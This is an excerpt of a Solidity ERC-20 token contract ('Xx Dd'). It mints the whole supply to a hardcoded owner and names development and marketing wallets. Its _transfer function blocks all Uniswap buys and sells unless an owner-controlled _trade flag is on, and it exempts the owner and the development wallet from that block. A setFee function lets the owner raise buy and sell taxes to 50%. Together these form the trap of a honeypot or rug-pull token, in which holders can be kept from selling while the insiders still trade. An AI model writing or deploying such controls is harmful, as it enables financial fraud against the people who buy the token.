...
contract Ownable is Context {
    ...
    constructor () {
        address msgSender = 0xE8c2495f7cAF9b342ea53470E76E958c6E373f1f;
        _owner = msgSender;
...
contract XD is Context, IERC20, Ownable {
    ...
    address payable private _developmentAddress = payable(0x58852f161d63eC2661F291e20de997b619231911);
    address payable private _marketingAddress = payable(0x1298ebbBf984A3d02d3ef32B671E058DB983ebCc);
    
    string private constant _name = "Xx Dd";
    ...
    constructor () {
        _rOwned[0xE8c2495f7cAF9b342ea53470E76E958c6E373f1f] = _rTotal;
        ...
        emit Transfer(address(0x0000000000000000000000000000000000000000), 0xE8c2495f7cAF9b342ea53470E76E958c6E373f1f, _tTotal);
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        _redisFee = 0;
        _taxFee = 0;
        if (from != owner() && to != owner() && from != _developmentAddress ) {
            if(from == uniswapV2Pair || to == uniswapV2Pair ){require(_trade);}
    ...
    function setFee( uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {
	    require(taxFeeOnBuy < 51, "Tax cannot be more than 51.");
	    require(taxFeeOnSell < 51, "Tax cannot be more than 51.");
        _taxFeeOnBuy = taxFeeOnBuy;
        _taxFeeOnSell = taxFeeOnSell;
    }

    function Trade(bool state) public onlyOwner returns (bool) {
	   _trade = state;
	   return true;
    }
